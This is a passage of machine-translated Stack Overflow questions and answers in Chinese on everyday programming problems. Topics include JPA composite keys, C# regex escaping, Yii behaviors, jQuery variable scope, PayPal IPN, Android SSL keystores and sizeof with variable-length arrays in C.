Nitpick：远离0和1，用真假。`var iAlreadyGotStuff = false;`.

[对于您的问题，请从http://webdesign.about.com/od/dhtml/a/aa101507.htm](http://webdesign.about.com/od/dhtml/a/aa101507.htm)查看此脚本

```
`<script type="text/javascript">
function unhide(divID) {
    var item = document.getElementById(divID);
    if (item) {
        item.className=(item.className=='hidden')?'unhidden':'hidden';
    }
}
</script>`
```

`如果 DIV 被隐藏，它会显示出来。如果它是可见的，它就是隐藏的。链接上有更详尽的解释。`

# java - Embeddable 类中的外键映射

> ID：10078224
> 
> 赞同：14
> 
> 时间：2012-04-09T18:57:29.763
> 
> 标签：java, jpa, entity-relationship, composite-key, embeddable

我正在`eclipselink`使用`JPA`. 我有一个实体，它有一个由两个字段组成的**复合键。**以下是我的**可嵌入**主键类的字段（成员）。

```
 @Embeddable
    public class LeavePK {
       @ManyToOne(optional = false)
       @JoinColumn(name = "staffId", nullable = false)
       private Staff staff;
       @Temporal(TemporalType.TIMESTAMP)
       private Calendar date;
       //setters and getters
    } 
```

我的实体将保存与员工相关的休假数据，因此我试图将员工对象和休假日期结合起来以生成复合键。除了我的逻辑，它不允许我在可嵌入类中有外键映射。当我尝试使用*JPA tools--> Generate Tables From Entity*时，它给出了如下错误，这解释了，但我没有得到它。

```
org.eclipse.persistence.exceptions.ValidationException
Exception Description: The mapping [staff] from the embedded ID class [class rs.stapp.entity.LeavePK] is an invalid mapping for this class. An embeddable class that is used with an embedded ID specification (attribute [leavePK] from the source [class rs.stapp.entity.Leave]) can only contain basic mappings. Either remove the non basic mapping or change the embedded ID specification on the source to be embedded. 
```

这是否意味着，我不能拥有一个也是外键的键（来自复合键）。是否有替代方法来完成此 ERM？请帮忙。谢谢

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-10T04:31:20.290

不要将关系放入 ID 类中，无论是 for`@IdClass`还是`@EmbeddedId`one。一个`@Embeddable`类只能包含注释`@Basic`, `@Column`, `@Temporal`, `@Enumerated`, `@Lob`, 或`@Embedded`。其他一切都是特定于提供者的语法（例如，Hibernate 允许这样做，但由于您使用的是 EclipseLink，它是 JPA RI，我怀疑这是您想要的）。

这是一个示例 JPA PK/FK 映射：

```
@Entity
@Table(name = "Zips")
public class Zip implements Serializable
{
    @EmbeddedId
    private ZipId embeddedId;

    @ManyToOne
    @JoinColumn(name = "country_code", referencedColumnName = "iso_code")
    private Country country = null;

    ...
}

@Embeddable
public class ZipId implements Serializable
{
    @Column(name = "country_code")
    private String countryCode;

    @Column(name = "code")
    private String code;

    ...
} 
```

高温高压

# c# - 处理包含美元字符的正则表达式转义替换文本

> ID：10078230
> 
> 赞同：22
> 
> 时间：2012-04-09T18:57:47.580
> 
> 标签：c#, regex, escaping

```
string input = "Hello World!";
string pattern = "(World|Universe)";
string replacement = "$1";

string result = Regex.Replace(input, pattern, replacement); 
```

有以下示例，结果将是`"Hello World!"`，因为`$1`被替换为第一组`(World|Universe)`，但是我想要的结果是`"Hello $1!"`

该`Regex.Escape`方法旨在用于转义 Regex 模式，而不是替换，因为它可以转义其他字符，如斜杠和其他 Regex 模式字符。对我的问题的明显解决方法是让我的替换等于`"$$1"`，并且将实现`"Hello $1!"`，但我想知道美元符号是否是我必须逃避的唯一值（假设`replacement`是用户生成的，我不知道提前） ，或者是否已经有一个辅助函数可以做到这一点。

有谁知道一个函数来逃避`Regex.Replace(string input, string pattern, string replacement)`使用的替换值？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-09T19:07:25.973

来自[MSDN](http://msdn.microsoft.com/en-us/library/xwewhkd1.aspx)：

> *replacement*参数指定要替换*input*中每个匹配项的字符串。*替换*可以由文字文本和[替换](http://msdn.microsoft.com/en-us/library/ewy2t5e0.aspx)的任意组合组成。

[定义](http://msdn.microsoft.com/en-us/library/ewy2t5e0.aspx)了以下替换：

*   $号码
*   ${名称}
*   $$
*   $&
*   $`
*   $'
*   $+
*   $_

> 替换是替换模式中唯一识别的特殊结构。不支持任何其他正则表达式语言元素，包括字符转义和匹配任何字符的句点 (.)。类似地，替换语言元素仅在替换模式中被识别，并且在正则表达式模式中永远无效。

所以看起来只有 $ 字符需要转义。

# python - 为什么在创建 OptionGroup 时必须提供两次解析器？

> ID：10078235
> 
> 赞同：1
> 
> 时间：2012-04-09T18:58:08.047
> 
> 标签：python, optparse

根据[Python 文档](http://docs.python.org/library/optparse.html#grouping-options)，您必须在创建 OptionGroup 时提供解析器：

```
group = OptionGroup(parser, "Dangerous Options",
                    "Caution: use these options at your own risk.  "
                    "It is believed that some of them bite.") 
```

然后在您完成创建后显式添加它`OptionGroup`：

```
parser.add_option_group(group) 
```

我目前无法访问源代码，但稍后会。也许别人知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:23:02.540

`OptionGroup`派生自`OptionContainer`(so does `OptionParser`)，它提供 (以及其他方法)`add_option`和`_check_conflict`. 该`parser`参数用于为其父`__init__`方法提供一些参数：

```
class OptionGroup (OptionContainer):

    def __init__(self, parser, title, description=None):
        self.parser = parser 
        OptionContainer.__init__(
            self, parser.option_class, parser.conflict_handler, description)
        self.title = title 
```

`self.parser`在另一个地方用于类似目的。所以我认为你传递`parser`给`__init__`只是这样当你向它添加选项时，选项组的行为方式与解析器相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:19:27.320

因为 OptParse 开发者没有添加

```
parser.add_option_group(self) 
```

在 OptionGroup 类构造函数中。

:P

# .net - SAML 2.0 与 .Net 1.1

> ID：10078245
> 
> 赞同：0
> 
> 时间：2012-04-09T18:59:01.783
> 
> 标签：.net, saml-2.0

有没有人在 .Net 1.1 中实现了 SAML 2.0 解决方案，特别是从身份提供者方面？我们的供应商之一正在为 SSO 升级到 SAML 2.0，不幸的是，我们在网站上使用 .Net 1.1 时遇到了困难。我找到了许多使用 .Net 实现 SAML 2.0 的解决方案，但在 .Net 1.1 中没有。任何示例将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T04:10:26.587

如果您有预算 - Ping Identity ( [https://www.pingidentity.com/](https://www.pingidentity.com) ) 有几个适用于 .NET 1.1 的选项。集成将是一个简单的 REST API，它与联合服务交互以处理所有 SAML 或 WS-Federation 变体。

（免责声明：我为 Ping 工作）

# android - 地图应用：城市指南 - 初级

> ID：10078248
> 
> 赞同：-1
> 
> 时间：2012-04-09T18:59:15.780
> 
> 标签：android, map

我正在尝试制作一个详细显示城市地图的应用程序。我应该使用哪个地图？如何在我的应用程序中添加标记？我怎样才能创建地图？请帮助伙计们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:10:59.127

如何从 android 开发者文档开始

[http://developer.android.com/guide/tutorials/views/hello-mapview.html](http://developer.android.com/guide/tutorials/views/hello-mapview.html)

# php - Yii - 默认分离行为

> ID：10078249
> 
> 赞同：1
> 
> 时间：2012-04-09T18:59:20.187
> 
> 标签：php, yii, yii-behaviour

我有一个实现了某种行为的模型。

```
class X 
{
....
    public function behaviours() 
    {
    return array (
        'YBehaviour' => array (
            'class' => 'application.path.to.class.y',
    );
    }
....
} 
```

问题是，就目前而言，我将它分离而不是需要它。我怎样才能“扭转”这个？我的意思是，不是每次我不需要它时都拆下它，而是每次我确实需要它时都附上它。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T04:42:33.350

来自这个 Yii wiki 页面 (http://www.yiiframework.com/wiki/44/behaviors-events/)

```
class MyBoringClass extends MySuperClass1 {
}

$classInstance = new MyBoringClass();
$classInstance->attachbehavior('uniqueName', new MySuperClass2); 
```

我相信这就是你所追求的

# c# - 在表单和自定义控件中设置 TabOrder

> ID：10078263
> 
> 赞同：1
> 
> 时间：2012-04-09T19:00:50.520
> 
> 标签：c#, winforms

以前我只有一个表格，TabOrder 很简单。现在我们已经将该表单中的部分控件移动到单独的 .NET 自定义控件中，并且我们将该自定义控件托管在前一个表单中所以现在一些按钮仍然是主表单，而表单的其余部分在里面自定义控件，它导致控件的 TabOrder 发生变化。我该如何解决这个问题，以便 TabOrder 的行为与以前一样？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T20:01:24.050

让我扩展我的评论，因为我只是想象当涉及控制容器时，标签顺序可能会令人困惑。

假设我们有六个按钮（A、B、C、D、E 和 F）：

```
 Z
A B | C D | E F 
```

（我知道这是一个糟糕的图表，但我不能快速而肮脏地做一个漂亮的图表）

A、B、E 和 F 直接在表单的表面上。C 和 D 包含在名为 Z 的用户控件中。

如果您希望制表符顺序遵循字母顺序，您可以设置`TabIndex`如下值：

```
A = 0
B = 1
Z = 2
E = 3
F = 4

C = 0
D = 1 
```

控件容器的选项卡相对于内部的控件。该算法相当简单：当按下 TAB 时，框架会在序列 (*) 中查找下一个控件。所以A标签到B和B标签到Z。Z是一个容器，所以焦点转到容器中的“第一个”子C.C标签到D.D标签，从我们离开的地方继续E.E标签到F . F tabs 离开它的容器，这是顶级容器所以我们重新开始，F tabs 到 A。

(*) 序列中可能存在间隙，如果有两个项目具有相同的 TabIndex，则通过它们的 Z-Order 索引进一步评估它们。

# xcode - iPhone Cocoa Touch-Interface Builder 元素在运行时移动

> ID：10078265
> 
> 赞同：0
> 
> 时间：2012-04-09T19:00:58.777
> 
> 标签：xcode, interface-builder

刚刚升级到 Xcode 4.3.2 并尝试建立一个 OSX 项目..

然而，Interface Builder 发生了一些有趣的事情。我觉得我无法控制我放置的物品最终会在哪里展示。一个例子：

![ib问题](../Images/9ba741f908e264833df6e1ba3d526be1.png)

我将如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T16:10:23.390

显然，这是 Xcode 4.3.2 的问题，降级到 4.3.1 并解决了问题。谢谢。

# .htaccess - 重定向带有 ASCII 字符的 url

> ID：10078268
> 
> 赞同：0
> 
> 时间：2012-04-09T19:01:10.293
> 
> 标签：.htaccess, ascii

我正在一个网站上工作，该网站有一些非常糟糕的网址要重定向，例如：-

```
/sites/default/files/files/National%20Commission%20of%20Enquiry%20-%20Intensive%20Alternative%20to%20Custody%20in%20Greater%20Manchester.doc 
```

这样做（删除 ASCII 空格）会导致 500 错误：-

```
redirect 301 /sites/default/files/files/National Commission of Enquiry - Intensive Alternative to Custody in Greater Manchester.doc http://www.makejusticework.org.uk/wp-content/uploads/National-Commission-of-Enquiry-Intensive-Alternative-to-Custody-in-Greater-Manchester-1.pdf 
```

将空格保留为 %20 只是 404。我认为它的 ASCII 字符妨碍了它 - 有没有一种可靠的方法来重定向 URL，比如这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T15:01:57.080

尝试用字符本身替换 % 编码的字符。因为那里有一些空格，所以需要将网址放在引号之间（“/sites/.../space here”）

所以在你的情况下：

```
redirect 301 "/sites/default/files/files/National Commission of Enquiry - Intensive Alternative to Custody in Greater Manchester.doc" http://www.makejusticework.org.uk/wp-content/uploads/National-Commission-of-Enquiry-Intensive-Alternative-to-Custody-in-Greater-Manchester-1.pdf 
```

# android - 如何使用查询从数据库中获取列值？

> ID：10078269
> 
> 赞同：0
> 
> 时间：2012-04-09T19:01:10.997
> 
> 标签：android, sql, sqlite

我在使用带有 android 的 sqlite 数据库方面是全新的。我想使用以下 SQL 语句从数据库中获取价值：

```
"SELECT description FROM games WHERE _id =" + categoryID 
```

其中 categoryID 是被点击元素在 listView 中的位置（也是 _id 列的值）。

```
listView.setOnItemClickListener(new OnItemClickListener() {
            public void onItemClick(AdapterView<?> parent, View view,

                String categoryID = new Integer(position).toString();

                final String SELECT_FROM = "SELECT description " + "FROM games "
                        + "WHERE _id = " + categoryID;
                database.query(SELECT_FROM);

                Intent intent = new Intent();
                intent.setClass(SqliteDbActivity.this, ViewAction.class);

                Bundle b = new Bundle();
                b.putString("categoryID", SELECT_FROM);
                intent.putExtras(b);

                startActivity(intent);

            }
        }); 
```

我知道我应该使用`database.query()`但我应该如何正确编写前面的 sql 语句来获取值？

表看起来像：

```
_id description name
1    some1       name1
2    some2       name2       
3    some3       name3 
```

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:07:53.997

```
String categoryID = new Integer(position).toString();

            final String SELECT_FROM = "SELECT description " + "FROM games "
                    + "WHERE _id = " + categoryID;
            Cursor cursor = database.query(SELECT_FROM);
            cursor.moveToFirst();

            Intent intent = new Intent();
            intent.setClass(SqliteDbActivity.this, ViewAction.class);

            Bundle b = new Bundle();
            b.putString("categoryID", cursor.getString(cursor.getColumnIndex("fieldname"));
            intent.putExtras(b);

            startActivity(intent); 
```

你`database.query(SELECT_FROM)`会回来`cursor`，在光标的帮助下你可以做你的工作

# javascript - jQuery 获取属性值，即使它发生变化

> ID：10078273
> 
> 赞同：3
> 
> 时间：2012-04-09T19:01:41.203
> 
> 标签：javascript, jquery

我有以下内容：

![在此处输入图像描述](../Images/f2536ec7e961a02fe52d01108ffc2c3e.png)

**Javascript：**

```
$(".bg .thumb_wrapper").click(function() {
    $(".bg .thumb_wrapper").removeClass("active");
    $(this).addClass("active");
}); 
```

所以每次我点击一个新背景时，它都会突出显示并被赋予一个“活动”类，并且之前的活动类被删除。

现在我需要做的就是创建一个变量并将其设置为该活动项目的数据名称属性。

**这是HTML：**

```
<div class="thumb_wrapper active">
    <img src="images/backgrounds/thumb/bg2.jpg" data-name="bg2.jpg">
</div> 
```

所以如果我把它放在点击函数中，它会正常工作：

```
var bg = $(".bg .thumb_wrapper.active img").attr("data-name");
console.log(bg); 
```

所以每次点击它时，它都会告诉我价值。但是我需要在该函数之外访问该变量..所以它需要是全局的。

我能做些什么来获取页面开头的 data-name 的值，而不是点击功能？当我点击一个新的 BG 并更新活动类时，变量也会更新吗？

希望这是有道理的。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:07:19.643

在函数外部声明变量，使其范围不限于单击处理程序。

```
var bg;

$(".bg .thumb_wrapper").click(function() {
   $(".bg .thumb_wrapper").removeClass("active");
   $(this).addClass("active");
   bg = $(".bg .thumb_wrapper.active img").data("name");
});

console.log(bg); //accessible outside 
```

如果您希望`bg`每次单击新 BG 时更新 的值，则必须如上所述在单击处理程序中进行分配。

[**现场示例**](http://jsfiddle.net/w8ptw/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:07:26.723

您所要做的就是在点击处理程序之外定义变量，但可能在`$(document).ready()`, 但在各种点击处理程序（或您正在使用的任何其他处理程序）中更新它：

```
$(document).ready(function(){
var bg = $(".bg .thumb_wrapper.active img['data-name']").attr("data-name") || '';
/* all the other JavaScript/jQuery, click handlers and so forth... */
}); 
```

在这种情况下，变量将等于`data-name`带有 a 的 img 的属性`data-name attribute`，如果不存在，则将设置为空字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:07:54.830

你有两种选择，

1.  `var bg`在全局范围内定义并在`.click`处理程序内更新它
2.  `$(".bg .thumb_wrapper.active img").attr("data-name");`只要你想知道`.active`'s的值就打电话`data-name`

**代码：**

```
var bg;
$(function () {
  $(".bg .thumb_wrapper").click(function() {
    $(".bg .thumb_wrapper").removeClass("active");
    $(this).addClass("active");
    bg = $(this).attr("data-name");
  });
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:08:19.807

首先，使用 $(el).data("name") 来获取数据属性值，而不是 .attr，如果你在启动时这样做，它将获取值，如果它在那里；

Javascript 是功能范围的，这意味着当您在点击处理程序的函数中定义它时，您将无法从该函数外部访问。而是定义变量并在更高的范围内分配，例如 DOM Ready，如下所示：

```
$(function() {
    var bg = $(".bg .thumb_wrapper.active img").data("name");
}); 
```

bg 将在页面加载时具有该值。并且可以从任何内部函数访问，例如单击处理程序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T19:10:59.223

如果我正确理解您的问题，您想在页面加载时创建和设置变量 bg，然后在每次单击缩略图时更新它？

如果是这样，这应该工作：

```
$(document).ready(function() {
    var bg = $(".bg .thumb_wrapper.active img").attr("data-name");
    $(".bg .thumb_wrapper").click(function() {
        $(".bg .thumb_wrapper").removeClass("active");
        $(this).addClass("active");
        bg = $(this).attr("data-name");
    });
}); 
```

# php - 发送电子邮件，当支付宝付款时

> ID：10078279
> 
> 赞同：0
> 
> 时间：2012-04-09T19:02:18.180
> 
> 标签：php, paypal, e-commerce

我搜索了互联网，但没有找到与此相关的任何内容。我想制作一个脚本，当客户向我的 Paypal 帐户付款时，它会自动向客户发送电子邮件。

为此，我想在成功付款后从 Paypal 获取 3 件东西，1\. 客户的电子邮件 ID，2\. 支付金额，3\. 产品名称

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:36:52.167

这个问题非常开放，简而言之，是的，您可以按照自己的要求去做。您可以检索的信息在很大程度上取决于您用于生成原始付款请求的内容。在这里查看服务：

[https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/howto_overview](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/howto_overview)

我强烈建议使用 IPN 来初始化电子邮件，为什么？付款数据传输 (PDT) 非常不可靠，因为它依赖于客户在购买后返回您的网站（这并不总是发生）。

IPN 是如何工作的？Paypal 让您网站上的脚本知道已付款，并发送一堆订单信息。然后，您的脚本工作就是将该数据发布回 Paypal 服务器，以便您可以验证数据是否真实。然后你可以用它做你想做的事。

在此处阅读有关 IPN 的信息：

[https://www.paypal.com/ipn](https://www.paypal.com/ipn)

根据购买时提供的数据，您应该能够从 IPN 响应中获得所需的一切，您可以在此处查看变量。

[https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_IPNandPDTVariables](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_IPNandPDTVariables)

# ios - 使用 UIManagedDocument 保存核心数据时出错

> ID：10078280
> 
> 赞同：0
> 
> 时间：2012-04-09T19:02:19.653
> 
> 标签：ios, core-data

我设置了异常断点，当我在 UIManagedDocument 上调用 - (void)saveToURL:(NSURL *)url forSaveOperation:(UIDocumentSaveOperation)saveOperation completionHandler:(void (^)(BOOL success))completionHandler 时，有时会收到以下错误：

```
* thread #3: tid = 0x2003, 0x357a8238 libobjc.A.dylib`objc_exception_throw, stop reason = breakpoint 1.1
    frame #0: 0x357a8238 libobjc.A.dylib`objc_exception_throw
    frame #1: 0x3154a122 CoreData`-[NSPersistentStore(_NSInternalMethods) _preflightCrossCheck] + 758
    frame #2: 0x314bb296 CoreData`-[NSPersistentStoreCoordinator executeRequest:withContext:error:] + 970
    frame #3: 0x31523286 CoreData`-[NSManagedObjectContext save:] + 522
    frame #4: 0x33d0ac5a UIKit`__84-[UIManagedDocument writeContents:toURL:forSaveOperation:originalContentsURL:error:]_block_invoke_0 + 30
    frame #5: 0x3152d3ee CoreData`developerSubmittedBlockToNSManagedObjectContextPerform + 74
    frame #6: 0x344fa7e6 libdispatch.dylib`_dispatch_barrier_sync_f_invoke + 26
    frame #7: 0x344fa646 libdispatch.dylib`dispatch_barrier_sync_f$VARIANT$mp + 62 
```

在我的控制台登录管理器中，我看到了这个：

> -NSUnderlyingError-=-0-x-5-e-8-0-2-0 -"--操作 -could-n'-t -be -completed-. -(-Cocoa -error -4-.- )-"-, -NSFilePath-=-/-var-/-mobile-/-Applications-/-F-1-A-7-0-2-6-C---5-ADD---4- FAF---9-C-8-C---8-8-7-5-1-4-F-6-EACA-/-Documents-/-PLDB-/-StoreContent-/-persistentStore-} Apr 9 12:45:47 未知区[232]：（错误）com.apple.UIKit.UIDocument：UIDocument 不可恢复错误，描述：操作无法'-t -be -completed-。-(-Cocoa -error -1-3-4-0-3-0-.-) -reason-: -(-null-) Apr 9 12:45:47 unknown District[232] : (Error) com. apple.UIKit.UIDocument：无法从错误中恢复，描述为：操作无法 -t -be -completed-。

它不会每次都发生，所以也许是时间问题？它不会使我的程序崩溃，但会在我的异常断点处中断，并且我的块的成功值为 NO。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-21T01:20:11.420

我听说过关于使用 UIManagedDocument 保存核心数据的不同意见。有人说永远不要调用 saveToUrl... 除非您第一次创建文档。但是，我记得从斯坦福 iOS 课程中了解到，当您明确想要保存时，可以调用 saveToUrl...。有人说用

`[document updateChangeCount:UIDocumentChangeDone]`

通知需要保存的核心数据。有人说它会在自己的时间里自救。有人说您可以使用 [context gainPermanentIDsForObjects: ...] 像 MSManagedObjectContext 上的以下类别来解决临时 ID 问题：

```
- (BOOL)obtainPermanentIDsForInsertedObjects:(NSError **)error
{
    NSSet * inserts = [self insertedObjects];

    if ([inserts count] == 0) return YES;

    return  [self obtainPermanentIDsForObjects:[inserts allObjects]
                                         error:error];
} 
```

我希望我知道答案，但我认为我的问题是我调用 saveToUrl... 太多了。我删除了我所有的 saveToUrl.. 调用，除了第一个调用，事情似乎越来越好。如果出于某种原因必须保存文档，请尝试上述方法之一。

# android - SSL冠军的挑战

> ID：10078282
> 
> 赞同：0
> 
> 时间：2012-04-09T19:02:24.080
> 
> 标签：android, ssl, openssl, ssl-certificate

> **可能重复：**
> [java 服务器和 android 客户端之间的 SSL 连接失败](https://stackoverflow.com/questions/10033872/ssl-connection-failure-between-java-server-and-android-client)

如果你们对 SSL 这么好！你能花点宝贵的时间让我知道在 android 和 java 服务器之间设置 ssl 连接时我哪里出错了。我厌倦了这种连接设置。最终得到“错误版本的密钥库”不知道我哪里出错了。

我不擅长 SSL，但仍在尽我所能。这是他们中的大多数人目前尚未解决的主要问题之一。请问有人有时间指导吗？[按照此链接http://blog.callistaenterprise.se/2011/11/24/creating-self-signed-certificates-for-use-on-android/](http://blog.callistaenterprise.se/2011/11/24/creating-self-signed-certificates-for-use-on-android/)创建了 BKS 格式的信任库和密钥库

我连续第三次提出这个问题，因为我没有得到回应。这就是为什么我将这篇文章作为对所有发现自己是 ssl 编码人员的挑战的原因。如果你很好，请分享你的知识。

这是安卓代码：

```
private SSLContext createSSLContext(final Context cont){
    SSLContext ssl_cont = null;
    try {
        Log.d(TAG, "TrustStore - Initializing");   
        KeyStore trustStore = KeyStore.getInstance("BKS");
        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
        InputStream trustStoreStream = cont.getResources().openRawResource(R.raw.clienttruststore);
        Log.d(TAG,"here...");
        trustStore.load(trustStoreStream, "client".toCharArray());
        trustManagerFactory.init(trustStore);
        Log.d(TAG, "TrustStore - Initialized");

        // Setup keystore
        Log.d(TAG, "KeyStore - Initializing");
        KeyStore keyStore = KeyStore.getInstance("BKS");
        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
        InputStream keyStoreStream = cont.getResources().openRawResource(R.raw.client);
        keyStore.load(keyStoreStream, "client".toCharArray());
        keyManagerFactory.init(keyStore, "client".toCharArray());
        Log.d(TAG, "KeyStore - Initialized");

        ssl_cont = SSLContext.getInstance("TLS");
        ssl_cont.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null); 
    } catch (Exception e) {
        // TODO Auto-generated catch block
        Log.d(TAG, "ERROR: " + e.getMessage());
    }
    return ssl_cont;
}

OnClickListener onConnClick = new OnClickListener() {

    public void onClick(View arg0) {
        // TODO Auto-generated method stub
        try {
            // Setup the SSL context to use the truststore and keystore
            Log.d(TAG, "Started..");
            SSLContext ssl_context = createSSLContext(cont);                
            SSLSocketFactory socketFactory = (SSLSocketFactory) ssl_context.getSocketFactory();
            socket = (SSLSocket) socketFactory.createSocket(ipadd.getText().toString().trim(), Integer.parseInt(port.getText().toString().trim()));
            dataOut = new DataOutputStream(socket.getOutputStream());
            dataIn = new DataInputStream(socket.getInputStream());
            msgin.setText("Connected");
            Log.d(TAG, "Completed..");
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            msgin.setText("Not connected");
            Log.d(TAG, "ERROR: " + e.getMessage());
        }
    }
}; 
```

Java服务器部分：

```
 SSLServerSocketFactory mySSLServerFac = null;
    SSLServerSocket mySSLServerSocket = null;
    SSLSocket mySSLSocket = null;
    String msg = null;
    System.out.print("I'm here\n");
    try {
        mySSLServerFac = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();
        mySSLServerSocket = (SSLServerSocket) mySSLServerFac.createServerSocket(9989);
        System.out.println("Listening on 9999\n");
        mySSLSocket = (SSLSocket) mySSLServerSocket.accept();

        DataInputStream input = new DataInputStream(mySSLSocket.getInputStream());
        DataOutputStream output = new DataOutputStream(mySSLSocket.getOutputStream());      
        do{
            System.out.println("Remote IP Address : " + mySSLSocket.getInetAddress());
            java.util.Scanner sc = new java.util.Scanner(System.in);
            output.writeUTF(sc.nextLine());
            msg = input.readUTF().toString();
            System.out.println(msg);
        }while(msg != "exit");
        System.out.println(msg);                
    } catch (Exception e) {
        e.printStackTrace();
    } 
```

堆栈跟踪：

```
04-10 00:09:02.065: DEBUG/SSLActivity(276): Started..
04-10 00:09:02.065: DEBUG/SSLActivity(276): Trust store - Initializing
04-10 00:09:02.075: DEBUG/SSLActivity(276): here...
04-10 00:09:02.085: DEBUG/SSLActivity(276): ERROR: Wrong version of key store.
04-10 00:09:02.095: WARN/System.err(276): java.lang.NullPointerException
04-10 00:09:02.116: WARN/System.err(276):     at com.pkg.sslmsg.SSLMsgActivity$1.onClick(SSLMsgActivity.java:97)
04-10 00:09:02.116: WARN/System.err(276):     at android.view.View.performClick(View.java:2408)
04-10 00:09:02.125: WARN/System.err(276):     at android.view.View$PerformClick.run(View.java:8816)
04-10 00:09:02.135: WARN/System.err(276):     at android.os.Handler.handleCallback(Handler.java:587)
04-10 00:09:02.135: WARN/System.err(276):     at android.os.Handler.dispatchMessage(Handler.java:92)
04-10 00:09:02.135: WARN/System.err(276):     at android.os.Looper.loop(Looper.java:123)
04-10 00:09:02.145: WARN/System.err(276):     at android.app.ActivityThread.main(ActivityThread.java:4627)
04-10 00:09:02.155: WARN/System.err(276):     at java.lang.reflect.Method.invokeNative(Native Method)
04-10 00:09:02.155: WARN/System.err(276):     at java.lang.reflect.Method.invoke(Method.java:521)
04-10 00:09:02.175: WARN/System.err(276):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
04-10 00:09:02.175: WARN/System.err(276):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
04-10 00:09:02.186: WARN/System.err(276):     at dalvik.system.NativeStart.main(Native Method)
04-10 00:09:02.196: DEBUG/SSLActivity(276): ERROR: null 
```

将此视为请求，请指导我摆脱这种情况。我曾尝试到处寻找解决方案，但最终只是失望。如果有人指导我，那将是很大的帮助！

对最后一次尝试抱有很大的希望！如果您知道这一点，请提供帮助。尽管您可能会觉得这很愚蠢。我只是一个学习者。

提前致谢。

# c - sizeof(array) 在运行时如何工作？

> ID：10078283
> 
> 赞同：25
> 
> 时间：2012-04-09T19:02:28.077
> 
> 标签：c, sizeof

我已经读过 C 中的 sizeof 运算符是在编译时解释的，并且由于在编译时编译器知道数组大小及其类型，sizeof 能够计算数组占用的字节数。但是 sizeof 如何为以下代码工作：

```
 #include<stdio.h>
 #include<string.h>
 int main()
 {
    int n;
    scanf("%d",&n);
    int a[n];
    int s=sizeof(a);
    printf("%d",s);
    return 0;
 } 
```

这里的数组大小在编译时是未知的，那么它是如何正常工作的呢？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-04-09T19:08:14.103

`sizeof`在 C89 中总是在编译时计算。由于 C99 和可变长度数组，当可变长度数组是`sizeof`操作数中表达式的一部分时，它是在运行时计算的。

对`sizeof`操作数的评估也是如此：如果操作数是可变长度数组类型，则在 C89 中不对其进行评估，但在 C99 中对其进行评估。例如：

```
int n = 5;
sizeof (int [n++]); 

// n is now 6 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-09T19:09:23.687

由于您正在应用`sizeof`一个可变长度数组，其大小在编译时并不完全已知，因此编译器必须生成代码以在运行时完成其中的一部分。

gcc 4.6.3 的高级优化器将您显示的代码转换为

```
scanf ("%d", &n);
t12 = (long unsigned int) n;
t13 = t12 * 4;
__builtin_alloca (t13);
t16 = (unsigned int) t12;
t17 = t16 * 4;
s18 = (int) t17;
printf ("%d", s18); 
```

这是否解释了引擎盖下发生的事情？（不要被看起来很傻的临时变量数量吓到——这是程序在我要求中间代码转储时处于[静态单一赋值形式的产物。）](http://gcc.gnu.org/onlinedocs/gccint/SSA.html)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-04-09T19:11:54.333

来自 C99 标准：

[6.5.3.4](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf)

运算符产生其`sizeof`操作数的大小（以字节为单位），它可以是表达式或带括号的类型名称。大小由操作数的类型决定。结果是一个整数。**如果操作数的类型是变长数组类型，则计算操作数**；否则，不计算操作数，结果是一个整数常量。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-04-09T19:06:15.073

在这种情况下，`sizeof()`在运行时进行评估。编译器，因为它知道 的大小`a`基于`n`数组声明时的值，所以生成代码以使用适当的值`n`来返回 的合理值`sizeof()`。

在 C99 中，并非所有的使用都`sizeof()`可以在编译时完全评估并简化为运行时常量。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-09T19:25:14.377

